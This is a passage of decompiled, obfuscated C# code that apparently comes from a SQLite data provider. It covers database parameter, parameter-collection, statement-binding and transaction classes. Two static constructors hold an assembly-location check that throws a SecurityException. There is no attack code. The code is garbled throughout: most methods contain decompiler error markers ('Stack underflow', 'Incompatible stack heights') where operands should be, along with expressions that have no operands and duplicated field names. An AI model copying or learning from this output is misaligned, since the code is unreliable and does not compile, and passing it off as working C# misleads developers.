		public override DataRowVersion SourceVersion
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0001 = (DataRowVersion)/*Error near IL_0009: Stack underflow*/;
			}
		}

		[TypeConverter(typeof(StringConverter))]
		[RefreshProperties(RefreshProperties.All)]
		public override object Value
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0045: Incompatible stack heights: 0 vs 1
				//IL_0048: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0001 = (object)/*Error near IL_0009: Stack underflow*/;
				if (((_0016)/*Error near IL_0010: Stack underflow*/)._0002 == (DbType)(-1) && this._0001 != null && this._0001 != DBNull.Value)
				{
					this._0002 = _0018._0001(_001D_0003._007E_009D_0006(this._0001));
				}
			}
		}

		public string TypeName
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0016)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0016)/*Error near IL_0009: Stack underflow*/)._0003 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal _0016(IDbCommand _0008_0019)
			: this()
		{
			this._0001 = _0008_0019;
		}

		public _0016()
			: this(null, (DbType)(-1), 0, null, DataRowVersion.Current)
		{
		}

		public _0016(string _000F_0018_0006)
			: this(_000F_0018_0006, (DbType)(-1), 0, null, DataRowVersion.Current)
		{
		}

		public _0016(string _000F_0018_0006, object _009C_0008)
			: this(_000F_0018_0006, (DbType)(-1), 0, null, DataRowVersion.Current)
		{
			Value = _009C_0008;
		}

		public _0016(string _000F_0018_0006, DbType _001C_0013_0006)
			: this(_000F_0018_0006, _001C_0013_0006, 0, null, DataRowVersion.Current)
		{
		}

		public _0016(string _000F_0018_0006, DbType _001C_0013_0006, string _0004_007F_0006)
			: this(_000F_0018_0006, _001C_0013_0006, 0, _0004_007F_0006, DataRowVersion.Current)
		{
		}

		public _0016(string _000F_0018_0006, DbType _001C_0013_0006, string _0004_007F_0006, DataRowVersion _0005_007F_0006)
			: this(_000F_0018_0006, _001C_0013_0006, 0, _0004_007F_0006, _0005_007F_0006)
		{
		}

		public _0016(DbType _001C_0013_0006)
			: this(null, _001C_0013_0006, 0, null, DataRowVersion.Current)
		{
		}

		public _0016(DbType _001C_0013_0006, object _009C_0008)
			: this(null, _001C_0013_0006, 0, null, DataRowVersion.Current)
		{
			Value = _009C_0008;
		}

		public _0016(DbType _001C_0013_0006, string _0004_007F_0006)
			: this(null, _001C_0013_0006, 0, _0004_007F_0006, DataRowVersion.Current)
		{
		}

		public _0016(DbType _001C_0013_0006, string _0004_007F_0006, DataRowVersion _0005_007F_0006)
			: this(null, _001C_0013_0006, 0, _0004_007F_0006, _0005_007F_0006)
		{
		}

		public _0016(string _000F_0018_0006, DbType _0006_007F_0006, int _0007_007F_0006)
			: this(_000F_0018_0006, _0006_007F_0006, _0007_007F_0006, null, DataRowVersion.Current)
		{
		}

		public _0016(string _000F_0018_0006, DbType _0006_007F_0006, int _0007_007F_0006, string _0004_007F_0006)
			: this(_000F_0018_0006, _0006_007F_0006, _0007_007F_0006, _0004_007F_0006, DataRowVersion.Current)
		{
		}

		public _0016(string _000F_0018_0006, DbType _0006_007F_0006, int _0007_007F_0006, string _0004_007F_0006, DataRowVersion _0005_007F_0006)
		{
			this.m__0002 = _000F_0018_0006;
			this._0002 = _0006_007F_0006;
			this._0001 = _0004_007F_0006;
			this._0001 = _0005_007F_0006;
			this._0001 = _0007_007F_0006;
			_0001 = true;
		}

		private _0016(_0016 _001D_0013)
			: this(_001D_0013.ParameterName, _001D_0013._0002, 0, _001D_0013.Direction, _001D_0013.IsNullable, 0, 0, _001D_0013.SourceColumn, _001D_0013.SourceVersion, _001D_0013.Value)
		{
			this.m__0002 = _001D_0013.m__0002;
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		public _0016(string _000F_0018_0006, DbType _0006_007F_0006, int _0007_007F_0006, ParameterDirection _0008_007F_0006, bool _000E_007F_0006, byte _000F_007F_0006, byte _0010_007F_0006, string _0004_007F_0006, DataRowVersion _0005_007F_0006, object _009C_0008)
			: this(_000F_0018_0006, _0006_007F_0006, _0007_007F_0006, _0004_007F_0006, _0005_007F_0006)
		{
			Direction = _0008_007F_0006;
			IsNullable = _000E_007F_0006;
			Value = _009C_0008;
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		public _0016(string _000F_0018_0006, DbType _0006_007F_0006, int _0007_007F_0006, ParameterDirection _0008_007F_0006, byte _000F_007F_0006, byte _0010_007F_0006, string _0004_007F_0006, DataRowVersion _0005_007F_0006, bool _0011_007F_0006, object _009C_0008)
			: this(_000F_0018_0006, _0006_007F_0006, _0007_007F_0006, _0004_007F_0006, _0005_007F_0006)
		{
			Direction = _0008_007F_0006;
			SourceColumnNullMapping = _0011_007F_0006;
			Value = _009C_0008;
		}

		public _0016(DbType _0006_007F_0006, int _0007_007F_0006)
			: this(null, _0006_007F_0006, _0007_007F_0006, null, DataRowVersion.Current)
		{
		}

		public _0016(DbType _0006_007F_0006, int _0007_007F_0006, string _0004_007F_0006)
			: this(null, _0006_007F_0006, _0007_007F_0006, _0004_007F_0006, DataRowVersion.Current)
		{
		}

		public _0016(DbType _0006_007F_0006, int _0007_007F_0006, string _0004_007F_0006, DataRowVersion _0005_007F_0006)
			: this(null, _0006_007F_0006, _0007_007F_0006, _0004_007F_0006, _0005_007F_0006)
		{
		}

		public override void ResetDbType()
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			((_0016)/*Error near IL_0008: Stack underflow*/)._0002 = (DbType)(-1);
		}

		public object _0002()
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			new _0016((_0016)/*Error near IL_0010: Stack underflow*/);
			return (object)/*Error near IL_0006: Stack underflow*/;
		}

		object ICloneable.Clone()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			return this._0002();
		}
	}
}
namespace _0007
{
	[Editor("Microsoft.VSDesigner.Data.Design.DBParametersEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
	[ListBindable(false)]
	internal sealed class _001E : DbParameterCollection
	{
		private global::_0010._001C m__0001;

		private List<global::_0011._0016> m__0001;

		internal bool _0001;

		public override bool IsSynchronized => false;

		public override bool IsFixedSize => false;

		public override bool IsReadOnly => false;

		public override object SyncRoot => null;

		public override int Count
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_001E)/*Error near IL_0007: Stack underflow*/).m__0001.Count;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public new global::_0011._0016 this[string _0002]
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 2
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = _001B_0007._007E_0011_0011;
				/*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/, (string)/*Error near IL_001c: Stack underflow*/);
				return (global::_0011._0016)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 2
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				_ = _001C_0007._007E_0012_0011;
				/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/, (string)/*Error near IL_0010: Stack underflow*/, (DbParameter)/*Error near IL_0010: Stack underflow*/);
			}
		}

		public new global::_0011._0016 this[int _0002]
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 2
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = _001D_0007._007E_0013_0011;
				/*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/, (int)/*Error near IL_001c: Stack underflow*/);
				return (global::_0011._0016)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 2
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				_ = _001A_0007._007E_0010_0011;
				/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/, (DbParameter)/*Error near IL_0010: Stack underflow*/);
			}
		}

		internal _001E(global::_0010._001C _001A_0013)
		{
			this.m__0001 = _001A_0013;
			this.m__0001 = new List<global::_0011._0016>();
			this._0001 = true;
		}

		public override IEnumerator _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			((_001E)/*Error near IL_0007: Stack underflow*/).m__0001.GetEnumerator();
			return (List<global::_0011._0016>.Enumerator)/*Error near IL_000e: Stack underflow*/;
		}

		public int Add(global::_0011._0016 parameter)
		{
			//IL_005e: Incompatible stack heights: 0 vs 3
			//IL_0065: Incompatible stack heights: 0 vs 1
			int num = -1;
			_ = global::_001C._0096_0003;
			_ = global::_0002._007E_001F;
			/*Error near IL_0065: Stack underflow*/((object)/*Error near IL_0065: Stack underflow*/);
			if (!/*Error near IL_0016: Stack underflow*/((string)/*Error near IL_0016: Stack underflow*/))
			{
				num = _008A_0004._007E_0002_000E(this, global::_0002._007E_001F(parameter));
			}
			if (num == -1)
			{
				num = this.m__0001.Count;
				this.m__0001.Add(parameter);
			}
			_001A_0007._007E_0010_0011(this, num, parameter);
			return num;
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override int _0001(object _0002)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			global::_0011._0016 parameter = (global::_0011._0016)/*Error near IL_0005: Stack underflow*/;
			((_001E)/*Error near IL_0017: Stack underflow*/).Add(parameter);
			return (int)/*Error near IL_000c: Stack underflow*/;
		}

		public override void _0001(Array _0002)
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			_ = global::_001A._007E_0081_0003;
			/*Error near IL_0038: Stack underflow*/((object)/*Error near IL_0038: Stack underflow*/);
			int num = (int)/*Error near IL_003b: Stack underflow*/;
			for (int i = 0; i < num; i++)
			{
				Add((global::_0011._0016)_008F_0004._007E_0017_000E(_0002, i));
			}
		}

		public override void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			((_001E)/*Error near IL_0008: Stack underflow*/)._0001 = true;
			((_001E)/*Error near IL_000f: Stack underflow*/).m__0001.Clear();
		}

		public override bool _0001(string _0002)
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _008A_0004._007E_0002_000E;
			/*Error near IL_001d: Stack underflow*/((object)/*Error near IL_001d: Stack underflow*/, (string)/*Error near IL_001d: Stack underflow*/);
			return (int)/*Error near IL_000e: Stack underflow*/ != -1;
		}

		public override bool _0001(object _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = ((_001E)/*Error near IL_0007: Stack underflow*/).m__0001;
			global::_0011._0016 item = (global::_0011._0016)/*Error near IL_000a: Stack underflow*/;
			((List<global::_0011._0016>)/*Error near IL_001c: Stack underflow*/).Contains(item);
			return (byte)/*Error near IL_0011: Stack underflow*/ != 0;
		}

		public override void _0001(Array _0002, int _0003)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			new NotImplementedException();
			throw /*Error near IL_0003: Stack underflow*/;
		}

		protected override DbParameter _0001(string _0002)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = _001D_0007._007E_0013_0011;
			_ = _008A_0004._007E_0002_000E;
			int num = /*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
			return /*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, num);
		}

		protected override DbParameter _0001(int _0002)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = ((_001E)/*Error near IL_0007: Stack underflow*/).m__0001;
			_ = ((List<global::_0011._0016>)/*Error near IL_0017: Stack underflow*/)[(int)/*Error near IL_0017: Stack underflow*/];
			return (DbParameter)/*Error near IL_000c: Stack underflow*/;
		}

		public override int _0001(string _0002)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			_ = ((_001E)/*Error near IL_0007: Stack underflow*/).m__0001.Count;
			int num = (int)/*Error near IL_004a: Stack underflow*/;
			for (int i = 0; i < num; i++)
			{
				if (_009D_0003._009D_0007(_0002, global::_0002._007E_001F(this.m__0001[i]), StringComparison.OrdinalIgnoreCase) == 0)
				{
					return i;
				}
			}
			return -1;
		}

		public override int _0002(object _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = ((_001E)/*Error near IL_0007: Stack underflow*/).m__0001;
			global::_0011._0016 item = (global::_0011._0016)/*Error near IL_000a: Stack underflow*/;
			((List<global::_0011._0016>)/*Error near IL_001c: Stack underflow*/).IndexOf(item);
			return (int)/*Error near IL_0011: Stack underflow*/;
		}

		public override void _0001(int _0002, object _0003)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 2
			((_001E)/*Error near IL_0008: Stack underflow*/)._0001 = true;
			_ = ((_001E)/*Error near IL_000f: Stack underflow*/).m__0001;
			global::_0011._0016 item = (global::_0011._0016)_0003;
			((List<global::_0011._0016>)/*Error near IL_001c: Stack underflow*/).Insert((int)/*Error near IL_001c: Stack underflow*/, item);
		}

		public override void _0001(object _0002)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 2
			((_001E)/*Error near IL_0008: Stack underflow*/)._0001 = true;
			_ = ((_001E)/*Error near IL_000f: Stack underflow*/).m__0001;
			global::_0011._0016 item = (global::_0011._0016)/*Error near IL_0012: Stack underflow*/;
			((List<global::_0011._0016>)/*Error near IL_001b: Stack underflow*/).Remove(item);
		}

		public override void _0001(string _0002)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = _009D_0002._007E_001A_0006;
			_ = _008A_0004._007E_0002_000E;
			int num = /*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, num);
		}

		public override void _0001(int _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 2
			((_001E)/*Error near IL_0008: Stack underflow*/)._0001 = true;
			_ = ((_001E)/*Error near IL_000f: Stack underflow*/).m__0001;
			((List<global::_0011._0016>)/*Error near IL_0016: Stack underflow*/).RemoveAt((int)/*Error near IL_0016: Stack underflow*/);
		}

		protected override void _0001(string _0002, DbParameter _0003)
		{
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0020: Incompatible stack heights: 0 vs 2
			//IL_0023: Incompatible stack heights: 0 vs 1
			_ = _001A_0007._007E_0010_0011;
			_ = _008A_0004._007E_0002_000E;
			int num = /*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
			/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/, num, _0003);
		}

		protected override void _0001(int _0002, DbParameter _0003)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 2
			((_001E)/*Error near IL_0008: Stack underflow*/)._0001 = true;
			_ = ((_001E)/*Error near IL_000f: Stack underflow*/).m__0001;
			global::_0011._0016 value = (global::_0011._0016)_0003;
			((List<global::_0011._0016>)/*Error near IL_001c: Stack underflow*/)[(int)/*Error near IL_001c: Stack underflow*/] = value;
		}

		internal void _0001(global::_0013._0017 _0002)
		{
			//IL_018e: Incompatible stack heights: 0 vs 1
			//IL_0194: Incompatible stack heights: 0 vs 1
			//IL_019e: Incompatible stack heights: 0 vs 1
			if (!((_001E)/*Error near IL_000a: Stack underflow*/)._0001)
			{
				return;
			}
			_ = ((_001E)/*Error near IL_0016: Stack underflow*/).m__0001.Count;
			if ((int)/*Error near IL_001d: Stack underflow*/ == 0 || this.m__0001._0001 == null)
			{
				return;
			}
			int num = 0;
			int num2 = -1;
			foreach (global::_0011._0016 item in this.m__0001)
			{
				num2++;
				string text = global::_0002._007E_001F(item);
				if (text == null)
				{
					text = global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107375626), new object[1] { num });
					num++;
				}
				bool flag = false;
				int num3 = ((_0002 != null) ? 1 : this.m__0001._0001.Count);
				global::_0013._0017 obj = _0002;
				for (int i = 0; i < num3; i++)
				{
					flag = false;
					if (obj == null)
					{
						obj = this.m__0001._0001[i];
					}
					if (obj._0001 != null && global::_0011._0018._0001(text, item, obj))
					{
						flag = true;
					}
					obj = null;
				}
				if (flag)
				{
					continue;
				}
				text = global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107375626), new object[1] { num2 });
				obj = _0002;
				for (int i = 0; i < num3; i++)
				{
					if (obj == null)
					{
						obj = this.m__0001._0001[i];
					}
					if (obj._0001 != null && global::_0011._0018._0001(text, item, obj))
					{
						flag = true;
					}
					obj = null;
				}
			}
			if (_0002 == null)
			{
				this._0001 = false;
			}
		}

		static _001E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0013
{
	internal sealed class _0017 : IDisposable
	{
		internal global::_0011._0013 _0001;

		internal string _0001;

		internal global::_0001._001F _0001;

		internal int _0001;

		internal string[] _0001;

		internal global::_0011._0016[] _0001;

		internal global::_0010._001C _0001;

		internal SQLiteConnectionFlags _0001;

		internal string[] _0002;

		internal bool _0001;

		internal string[] TypeDefinitions => ((_0017)/*Error near IL_0007: Stack underflow*/)._0002;

		internal _0017(global::_0011._0013 _0013_0017_0006, SQLiteConnectionFlags _008C_0003, global::_0001._001F _0008_0014_0006, string _0084_007F_0006, _0017 _0004_0014_0006)
		{
			this._0001 = _0013_0017_0006;
			this._0001 = _0008_0014_0006;
			this._0001 = _0084_007F_0006;
			this._0001 = _008C_0003;
			int num = 0;
			int num2 = this._0001._0001(this, this._0001);
			if (num2 <= 0)
			{
				return;
			}
			if (_0004_0014_0006 != null)
			{
				num = _0004_0014_0006._0001;
			}
			this._0001 = new string[num2];
			this._0001 = new global::_0011._0016[num2];
			for (int i = 0; i < num2; i++)
			{
				string text = this._0001._0001(this, this._0001, i + 1);
				if (string.IsNullOrEmpty(text))
				{
					text = global::_0011._0018._0001((IFormatProvider)CultureInfo.InvariantCulture, _0080._0014._0001(107375626), new object[1] { num });
					num++;
					this._0001++;
				}
				this._0001[i] = text;
				this._0001[i] = null;
			}
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_0017)/*Error near IL_001a: Stack underflow*/, true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0011._0018._0001((_0017)/*Error near IL_000f: Stack underflow*/, false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		internal void _0001(int _0002, global::_0011._0016 _0003)
		{
			//IL_045e: Incompatible stack heights: 0 vs 1
			//IL_0468: Incompatible stack heights: 0 vs 1
			//IL_0472: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107375617);
				new SQLiteException((string)/*Error near IL_0472: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			if ((this._0001 & SQLiteConnectionFlags.UseConnectionBindValueCallbacks) == SQLiteConnectionFlags.UseConnectionBindValueCallbacks)
			{
				bool flag = default(bool);
				global::_0011._0018._0001(_0003, ref flag, _0002, this);
				if (flag)
				{
					return;
				}
			}
			object obj = _0083_0003._007E_001F_0007(_0003);
			DbType dbType = _0007_0007._007E_009B_0010(_0003);
			if (obj != null && dbType == DbType.Object)
			{
				dbType = global::_0011._0018._0001(_001D_0003._007E_009D_0006(obj));
			}
			if ((this._0001 & SQLiteConnectionFlags.LogPreBind) == SQLiteConnectionFlags.LogPreBind)
			{
				IntPtr intPtr = global::_0001._001F._0001(this._0001);
				global::_0011._0018._0001(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107376064), new object[4] { intPtr, _0002, dbType, obj }));
			}
			if (obj == null || _001E_0007._0014_0011(obj))
			{
				this._0001._0001(this, this._0001, _0002);
				return;
			}
			CultureInfo cultureInfo = _008F_0003._008B_0007();
			bool flag2 = (this._0001 & SQLiteConnectionFlags.BindInvariantText) == SQLiteConnectionFlags.BindInvariantText;
			if ((this._0001 & SQLiteConnectionFlags.BindAllAsText) == SQLiteConnectionFlags.BindAllAsText)
			{
				if (obj is DateTime)
				{
					this._0001._0001(this, this._0001, _0002, (DateTime)obj);
				}
				else
				{
					this._0001._0001(this, this._0001, _0002, flag2 ? global::_0011._0018._0001(obj, (IFormatProvider)cultureInfo) : global::_0002._007E_0006(obj));
				}
				return;
			}
			CultureInfo cultureInfo2 = _008F_0003._008C_0007();
			if ((this._0001 & SQLiteConnectionFlags.ConvertInvariantText) == SQLiteConnectionFlags.ConvertInvariantText)
			{
				cultureInfo2 = cultureInfo;
			}
			switch (dbType)
			{
			case DbType.Date:
			case DbType.DateTime:
			case DbType.Time:
				this._0001._0001(this, this._0001, _0002, (obj is string) ? global::_0011._0018._0001((global::_0001._001A)this._0001, (string)obj) : _001F_0007._0015_0011(obj, cultureInfo2));
				break;
			case DbType.Boolean:
				this._0001._0001(this, this._0001, _0002, global::_0011._0018._0001(_0002: true, (IFormatProvider)cultureInfo2, obj));
				break;
			case DbType.SByte:
				this._0001._0001(this, this._0001, _0002, _007F_0007._0016_0011(obj, cultureInfo2));
				break;
			case DbType.Int16:
				this._0001._0001(this, this._0001, _0002, _0080_0007._0017_0011(obj, cultureInfo2));
				break;
			case DbType.Int32:
				this._0001._0001(this, this._0001, _0002, _0082_0004._0090_0008(obj, cultureInfo2));
				break;
			case DbType.Int64:
				this._0001._0001(this, this._0001, _0002, _001F_0006._0014_0010(obj, cultureInfo2));
				break;
			case DbType.Byte:
				this._0001._0001(this, this._0001, _0002, (uint)_0081_0007._0018_0011(obj, cultureInfo2));
				break;
			case DbType.UInt16:
				this._0001._0001(this, this._0001, _0002, (uint)_0082_0007._0019_0011(obj, cultureInfo2));
				break;
			case DbType.UInt32:
				this._0001._0001(this, this._0001, _0002, _0083_0007._001A_0011(obj, cultureInfo2));
				break;
			case DbType.UInt64:
				this._0001._0001(this, this._0001, _0002, _0084_0007._001B_0011(obj, cultureInfo2));
				break;
			case DbType.Currency:
			case DbType.Double:
			case DbType.Single:
				this._0001._0001(this, this._0001, _0002, _007F_0006._0015_0010(obj, cultureInfo2));
				break;
			case DbType.Binary:
				this._0001._0001(this, this._0001, _0002, (byte[])obj);
				break;
			case DbType.Guid:
				if (this._0001.Connection._0016)
				{
					this._0001._0001(this, this._0001, _0002, ((Guid)obj).ToByteArray());
				}
				else
				{
					this._0001._0001(this, this._0001, _0002, flag2 ? global::_0011._0018._0001(obj, (IFormatProvider)cultureInfo) : global::_0002._007E_0006(obj));
				}
				break;
			case DbType.Decimal:
				this._0001._0001(this, this._0001, _0002, _0086_0007._001C_0011(obj, cultureInfo2).ToString(cultureInfo));
				break;
			default:
				this._0001._0001(this, this._0001, _0002, flag2 ? global::_0011._0018._0001(obj, (IFormatProvider)cultureInfo) : global::_0002._007E_0006(obj));
				break;
			}
		}
	}
}
namespace _0003
{
	internal abstract class _0016 : DbTransaction
	{
		internal global::_0017._0080 _0001;

		internal int _0001;

		private System.Data.IsolationLevel m__0001;

		internal bool _0001;

		public override System.Data.IsolationLevel IsolationLevel
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0016)/*Error near IL_0014: Stack underflow*/);
				return ((_0016)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
		}

		public new global::_0017._0080 Connection
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0016)/*Error near IL_0014: Stack underflow*/);
				return ((_0016)/*Error near IL_000b: Stack underflow*/)._0001;
			}
		}

		protected override DbConnection DbConnection
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((_0016)/*Error near IL_000d: Stack underflow*/).Connection;
				return (DbConnection)/*Error near IL_0005: Stack underflow*/;
			}
		}

		internal _0016(global::_0017._0080 _001B_0013_0006, bool _009E_0019_0006)
		{
			this._0001 = _001B_0013_0006;
			this._0001 = this._0001._0017;
			this.m__0001 = (_009E_0019_0006 ? System.Data.IsolationLevel.ReadCommitted : System.Data.IsolationLevel.Serializable);
			_0001(_009E_0019_0006);
		}

		protected override void Dispose(bool disposing)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 2
			try
			{
				if (!((_0016)/*Error near IL_0007: Stack underflow*/)._0001 && (int)/*Error near IL_000d: Stack underflow*/ != 0)
				{
					_ = 0;
					if (global::_0011._0018._0001((byte)/*Error near IL_0015: Stack underflow*/ != 0, (_0016)/*Error near IL_0015: Stack underflow*/))
					{
						_0002(_0002: false);
					}
				}
			}
			finally
			{
				global::_0005._0094(this, disposing);
				this._0001 = true;
			}
		}

		public override void Rollback()
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_0016)/*Error near IL_001d: Stack underflow*/);
			_ = 1;
			global::_0011._0018._0001((byte)/*Error near IL_000c: Stack underflow*/ != 0, (_0016)/*Error near IL_000c: Stack underflow*/);
			_0002(_0002: true);
		}

		protected abstract void _0001(bool _0002);

		protected abstract void _0002(bool _0002);

		static _0016()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0010
{
	internal class _007F : global::_0003._0016
	{
		internal new bool _0001;

		internal _007F(global::_0017._0080 _001B_0013_0006, bool _009E_0019_0006)
			: base(_001B_0013_0006, _009E_0019_0006)
		{
		}

		protected override void Dispose(bool disposing)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
